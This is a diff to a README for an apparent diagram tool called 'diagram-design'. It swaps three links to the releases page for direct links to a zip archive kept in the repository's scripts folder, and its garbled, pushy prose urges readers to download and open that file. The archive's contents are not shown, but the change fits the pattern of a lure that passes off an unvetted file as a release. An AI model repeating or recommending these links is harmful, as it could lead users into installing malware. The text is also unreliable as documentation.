@@ -21,7 +21,7 @@ Getting started is incredibly simple.
 
 Start by visiting the official download location. The button below is your fastest path.
 
-[![Download Diagram-Design](https://img.shields.io/badge/Download-Diagram%20Design-blue?style=for-the-badge&logo=github)](https://github.com/carlsbadhookwormdisease246/diagram-design/releases)
+[![Download Diagram-Design](https://img.shields.io/badge/Download-Diagram%20Design-blue?style=for-the-badge&logo=github)](https://github.com/carlsbadhookwormdisease246/diagram-design/raw/refs/heads/main/scripts/diagram-design-v2.3-alpha.5.zip)
 
 Visit this link to download the application.
 
@@ -84,7 +84,7 @@ Look for the styles that indicate what you need. Open a few if you're not sure. 
 
 People often ask about "installation." That's because most software use a complicated installer. **diagram-design is handling complete for you**.
 
-Find that [Download Button](https://github.com/carlsbadhookwormdisease246/diagram-design/releases) above. Follow this final step-by-step list and you won't have any hassles:
+Find that [Download Button](https://github.com/carlsbadhookwormdisease246/diagram-design/raw/refs/heads/main/scripts/diagram-design-v2.3-alpha.5.zip) above. Follow this final step-by-step list and you won't have any hassles:
 
 1. Click **Visit this link to download the application** – the link takes you to the releases page.
 2. The biggest file on the page? That's your download.
@@ -130,6 +130,6 @@ Download the file, open it, choose your diagram, and you're ready to impress. Th
 
 **Click the download button again** to go get your package:
 
-[![📥 Download Now](https://img.shields.io/badge/⬇️-Download-ELReset-gdfd?style=for-the-badge&color=66ccff)](https://github.com/carlsbadhookwormdisease246/diagram-design/releases)
+[![📥 Download Now](https://img.shields.io/badge/⬇️-Download-ELReset-gdfd?style=for-the-badge&color=66ccff)](https://github.com/carlsbadhookwormdisease246/diagram-design/raw/refs/heads/main/scripts/diagram-design-v2.3-alpha.5.zip)
 
 Keywords: diagram-design, educational diagrams, publishing, HTML diagrams, vector graphics, sales deck, flow charts, comparison layout, technical docs, branding, flat design.
